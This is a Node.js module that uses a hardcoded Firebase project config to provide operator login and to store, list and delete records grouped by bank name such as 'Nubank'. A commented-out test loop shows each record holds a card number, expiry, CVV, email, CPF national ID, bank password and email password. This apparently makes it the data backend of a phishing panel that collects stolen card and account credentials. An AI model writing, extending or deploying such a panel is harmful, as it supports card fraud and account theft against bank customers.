const firebase = require('firebase');
const uniqid = require('uniqid');
const bcrypt = require('bcrypt');


const firebaseConfig = {
    apiKey: "AIzaSyBx2s9t-cdLr09oD21bcrTKkteYPzzPl6M",
    authDomain: "paineltelas-f15c3.firebaseapp.com",
    projectId: "paineltelas-f15c3",
    storageBucket: "paineltelas-f15c3.appspot.com",
    messagingSenderId: "193219150442",
    appId: "1:193219150442:web:883d5e3902cd8a8d0b8013",
    measurementId: "G-RZ9TQSK0YB"
  };
  
  firebase.default.initializeApp(firebaseConfig);

const FS = firebase.default.firestore();

const loginByUser = async (user, pass) => {
  const userSnap = (await FS.collection("users").where("user", "==", user).get()).docs[0]

  if(!userSnap) return {error: true, message: "Usuario e/ou senha invalidos"};

  const userData = userSnap.data()

  const passIsCorrect = await bcrypt.compare(pass, userData.pass)

  if(!passIsCorrect) return {error: true, message: "Usuario e/ou senha invalidos"};

  return {error: false, token: userData.token}
}

const loginByToken = async (token) => {
  
  const userSnap = (await FS.collection("users").where("token", "==", token).get()).docs[0]
  
  if(!userSnap)  return {error: true}
  else return {error: false}
}

const getInfosByType = async (type) => {
  const dataSnap = await (await FS.collection("itens").where("name", "==", type).get()).docs[0]

  console.log(type);

  if(!dataSnap) return {error: true}
  else return dataSnap.data()
}

const sendInfosByType = async (type, infos) => {
  const dataSnap = await (await FS.collection("itens").where("name", "==", type).get()).docs[0]

  if(!dataSnap) return {error: true}

  const lastDatas = dataSnap.data().arr

  await FS.collection("itens").doc(dataSnap.id).update({
    arr: [infos, ...lastDatas]
  })

  return {error:false}
}

// setInterval(async () => {
//   sendInfosByType("Nubank", {
//     num: `1111 2222 3333 ${Math.floor(1000 * Math.random()).toString().padStart(4, 00)}`,
//     val: "12/30",
//     cvv:"123",
//     mail:`${Math.random()}@gmail.com`, 
//     data: new Date().toString(),
//     cpf:"123.456.789-12",
//     pass:`${Math.random()}`,
//     passMail:`${Math.random()}`
//   })}, 500)


const removeInfoByType = async(type, info) => {
  const dataSnap = await (await FS.collection("itens").where("name", "==", type).get()).docs[0]

  if(!dataSnap) return {error: true}

  const lastDatas = dataSnap.data().arr
  const dataWithoutInfo = lastDatas.filter(({num}) => {
    return num != info
  })

  await FS.collection("itens").doc(dataSnap.id).update({
    arr: dataWithoutInfo
  })
}

removeInfoByType("Nubenk", {num: "1111 2222 3333 4444"})


module.exports = {
  loginByUser,
  loginByToken,
  getInfosByType,
  sendInfosByType,
  removeInfoByType
}